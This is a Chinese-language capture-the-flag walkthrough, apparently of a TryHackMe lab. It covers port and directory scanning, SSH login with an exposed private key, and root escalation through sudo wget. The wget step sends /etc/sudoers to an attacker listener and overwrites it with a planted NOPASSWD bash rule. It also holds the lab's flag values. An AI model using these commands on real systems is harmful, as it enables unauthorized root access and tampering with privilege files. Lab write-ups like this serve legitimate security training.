#服务发现
```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.106.99    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-25 23:41 EDT
Nmap scan report for 10.10.106.99
Host is up (0.38s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```


#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u http://10.10.106.99 -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 207627

Error Log: /root/dirsearch/logs/errors-21-09-25_23-42-55.log

Target: http://10.10.106.99

[23:42:56] Starting: 
[23:42:58] 301 -  314B  - /sitemap  ->  http://10.10.106.99/sitemap/
[23:42:58] 200 -   11KB - /        
CTRL+C detected: Pausing threads, please wait...                              
                                               
Canceled by the user
```

sitemap是一个叫```UNAPP```的软件网站介绍页，继续对这个这个网站爆破目录

```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py  -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.106.99/sitemap/

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-26_02-39-06.log

Target: http://10.10.106.99/sitemap/

[02:39:07] Starting: 
[02:39:09] 200 -   21KB - /sitemap/
[02:39:09] 301 -  319B  - /sitemap/images  ->  http://10.10.106.99/sitemap/images/
[02:39:11] 301 -  316B  - /sitemap/css  ->  http://10.10.106.99/sitemap/css/
[02:39:12] 301 -  315B  - /sitemap/js  ->  http://10.10.106.99/sitemap/js/
[02:39:19] 301 -  318B  - /sitemap/fonts  ->  http://10.10.106.99/sitemap/fonts/
[02:44:16] 301 -  317B  - /sitemap/sass  ->  http://10.10.106.99/sitemap/sass/   
```


在about页面找到两个开发者的名字
```
Emily Turner
Adam Morris
```
做成一个可能的用户账号爆破ssh，用一个小字典，无果
```
emily
turner
emilyturner
adam
morris
adammorris
```

在http://10.10.106.99/首页源代码找到一行注释

```Jessie don't forget to udate the webiste```

确定一个用户名：```jessie```


在```http://10.10.106.99/sitemap/.ssh/```找到ssh登录秘钥
```
Index of /sitemap/.ssh
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	id_rsa	2019-10-26 09:24 	1.6K	 
Apache/2.4.18 (Ubuntu) Server at 10.10.106.99 Port 80

```

根据用户名和ssh登录秘钥，登录靶机，拿到user.txt
```
┌──(root💀kali)-[~/tryhackme/wgel]
└─# ssh -i id_rsa jessie@10.10.106.99 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

Last login: Sun Sep 26 11:59:45 2021 from 10.13.21.169
jessie@CorpOne:~$ find / -name user_flag.txt

find: ‘/var/cache/lightdm/dmrc’: Permission denied
find: ‘/var/cache/cups’: Permission denied
find: ‘/var/log/speech-dispatcher’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/lib/colord/.cache’: Permission denied
find: ‘/var/lib/snapd/void’: Permission denied
find: ‘/var/lib/snapd/cookie’: Permission denied
find: ‘/var/lib/udisks2’: Permission denied
find: ‘/var/lib/update-notifier/package-data-downloads/partial’: Permission denied
find: ‘/var/lib/lightdm-data/lightdm’: Permission denied
find: ‘/var/lib/lightdm’: Permission denied
find: ‘/var/lib/polkit-1’: Permission denied
/home/jessie/Documents/user_flag.txt


jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6

```

#查看sudo权限
```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```
#提权思路


通过wget我们事实上可以更换靶机上的任何文件，那么我们现在尝试替换```/etc/sudoers```文件，把```jessie  ALL=(root) NOPASSWD: /bin/bash```这一行添加到sudoers文件中，然后再覆盖掉靶机上的sudoers文件

这样我们就可以无需密码切换到root的bash

1，监听
```nc -lvnp 80 ```

2，发送
```sudo  -u root /usr/bin/wget --post-file=/etc/sudoers 10.13.21.169```

3,接收



把```/etc/sudoers```传回攻击机以备编辑
```sudo  -u root /usr/bin/wget --post-file=/etc/sudoers  10.13.21.169```

#编辑sudoers
```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jessie  ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(root) NOPASSWD: /bin/bash
```

#从靶机下载覆盖编辑好的sudoers文件，成功提权
```
jessie@CorpOne:~$ sudo /usr/bin/wget http://10.13.21.169:8000/sudoers -O /etc/sudoers
--2021-09-26 12:45:55--  http://10.13.21.169:8000/sudoers
Connecting to 10.13.21.169:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 863 [application/octet-stream]
Saving to: ‘/etc/sudoers’

/etc/sudoers        100%[========================================================================================================================================>]     863  --.-KB/s    in 0,001s  

2021-09-26 12:45:55 (1,54 MB/s) - ‘/etc/sudoers’ saved [863/863]

jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
    (root) NOPASSWD: /bin/bash
jessie@CorpOne:~$ sudo bash
root@CorpOne:~# cat /root/root_flag.txt 
b1b968b37519ad1daa6408188649263d
root@CorpOne:~# 
```